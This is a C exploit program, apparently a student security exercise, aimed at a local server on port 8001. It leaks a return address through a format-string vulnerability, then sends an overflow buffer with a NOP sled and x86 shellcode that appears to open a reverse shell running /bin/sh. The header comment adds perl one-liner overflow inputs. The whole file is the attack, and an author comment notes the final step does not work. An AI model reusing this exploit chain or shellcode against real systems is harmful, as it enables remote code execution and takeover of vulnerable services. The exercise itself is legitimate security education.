/*
 * Exploit.c
 * ----------------------------
 *
 *  Authors:
 *    - Anthony Troy (14212116)
 *    - Anthony Magann (14211966)
 *
 *   Can be ran in the following ways:
 *    -  ./exploit                  // scrape ret adress and send shellcode
 *    -  ./exploit 1 "%p%p%p%p"     // send input to str formatting vulnerability
 *    -  ./exploit 2 "$(perl -e 'print "AAAA"x300';)"   // send input to buffer offerflow vulnerability
 *
 */
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define PORTNUM 8001
#define BLENGTH 256
#define NOP 0x90

char ret_addr_str[10];
long ret_add_long;

char shellcode[] =
"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x1f\x41\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

static void
test_le_hack_1(int s, char* arg)
{
  char buffer[BLENGTH];
  /* Receive test prompt */
  recv(s, (void *)buffer, BLENGTH, 0);
  /* Cpy arg to buffer */
  strncpy(buffer, arg, BLENGTH);
  /* Send test response */
  send(s, (void *)buffer, BLENGTH, 0);
  /* Receive the test reply from server */
  recv(s, (void *)buffer, BLENGTH, 0);
  printf("%s\n", buffer);
}

static void
test_le_hack_2(int s, char* arg)
{
  char *ans = "1\n";
  char buffer[BLENGTH];
  
  /* Receive test prompt */
  recv(s, (void *)buffer, BLENGTH, 0);
  printf("%s\n", buffer);
  /* Step through app */
  send(s, ans, BLENGTH, 0);
  
  /* Receive second test prompt */
  recv(s, (void *)buffer, BLENGTH, 0);
  printf("%s\n", buffer);
  /* Cpy arg to buffer */
  strncpy(buffer, arg, BLENGTH);
  /* Send second response */
  send(s, (void *)buffer, BLENGTH, 0);
  
  /* Receive the third test reply from server */
  recv(s, (void *)buffer, BLENGTH, 0);
  printf("%s\n", buffer);
}

static void
scrape_le_stack(int s)
{
  char buffer[BLENGTH];
  char response_buffer[] = "%p %p %p %p %p %p %p %p %p"; //ret addr is the last one
  char res_str_noise[] = " , is not a valid option\n." \
                         "Please select an option:\n1. Time\n2. Date\n";
  int res_str_trim_len, res_buffer_index;
  
  /* Receive a prompt from the server */
  if (recv(s, (void *)buffer, BLENGTH, 0) != BLENGTH) {
    perror("recv()");
    exit(EXIT_FAILURE);
  }

  /* Send the response to the server */
  send(s, (void *)response_buffer, BLENGTH, 0);

  /* Receive a reply from the server */
  recv(s, (void *)response_buffer, BLENGTH, 0);
  printf("Scrape Response:\n %s\n", response_buffer);
  
  /* Slice the ret_addr_str from the response_buffer */
  res_str_trim_len = strlen(res_str_noise) + 10;
  res_buffer_index = strlen(response_buffer) - res_str_trim_len;
  memcpy(ret_addr_str, &response_buffer[res_buffer_index], 10);
  printf("Return address:%s\n", ret_addr_str);
  
  /* Parse ret_addr_str to ret_add_long */
  ret_add_long = strtol(ret_addr_str, NULL, 0);
  printf("Return address (long): %ld\n", ret_add_long);
}

static void
hack_le_stack(int s)
{
  int i;
  long *addr_ptr;
  char buffer[BLENGTH];
  char *ptr;
  
  addr_ptr = (long *) buffer;
  
  /* Populate buffer with new ret addr */
  for (i = 0; i < BLENGTH; i+=4)
    *(addr_ptr++) = ret_add_long;
  
  /* Add NOPs to buffer */
  memset(buffer, NOP, 32);
  
  /* Add Shellcode to buffer and terminate */
  ptr = buffer;
  ptr += 32;
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];
  buffer[BLENGTH - 1] = '\0';
  
  /* Send the buffer */
  send(s, (void *)buffer, BLENGTH,0);
  /* Receive a reply from the server */
  recv(s, (void *)buffer, BLENGTH, 0);
  printf("Attack Response:\n %s\n", buffer); // does not work </3
}


/* Connect and talk to the server */
int
main(int argc, char *argv[])
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;
  
  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }
  
  /* Server listening on localhost interface */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }
  
  /* Fill in socket address */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);
  
  /* Connect to server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }
  
  /* Test sending inputs to server or send payload */
  if (argc == 3) {
    /* Test sending command arg to server */
    int test_path_number = atoi(argv[1]);
    if (test_path_number == 1)
      test_le_hack_1(s, argv[2]); //test the first path of input (Date/Time input)
    else
      test_le_hack_2(s, argv[2]); //test the second path of input (Y/N input)
  }
  else {
    /* Scrape the return address to be overwriten on le server */
    scrape_le_stack(s);
   
    /* Send attack str to le server */
    hack_le_stack(s);
  }

  /* Close the socket */
  close(s);

  return (0);
}
